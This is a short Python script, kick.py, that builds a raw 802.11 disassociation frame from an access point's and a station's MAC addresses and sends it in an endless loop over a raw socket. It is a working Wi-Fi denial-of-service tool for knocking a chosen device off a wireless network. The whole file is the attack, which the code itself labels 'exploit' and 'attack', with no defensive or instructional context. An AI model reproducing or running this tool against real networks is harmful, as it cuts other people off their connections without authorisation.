#!/usr/bin/env python3
  


'Usage: kick.py  <if> <wap> <sta>'



from socket import *
from sys import argv



disassoc = '00000d00048002000200010000c0003a01{0}{1}{0}706a0100'



def mac(string):
    return string.lower().replace(':', str())



def construct(wap, sta):
    string = disassoc.format(mac(wap), mac(sta))
    packet = bytes.fromhex(string)

    return packet



def flood(iface, packet):

    sock = socket(AF_PACKET, SOCK_RAW, 0)
    sock.bind((iface, 0))

    while True:
        sock.send(packet)



def exploit(iface, wap, sta):
    try:
        packet = construct(wap, sta)
        flood(iface, packet)

    except:
        return



def main():
    if len(argv) == 4:

        print(f'kicking {argv[3]}, ^C to stop.\n')
        exploit(*argv[1:])

        print('stopping attack.')

    else:
        print(__doc__)



main()
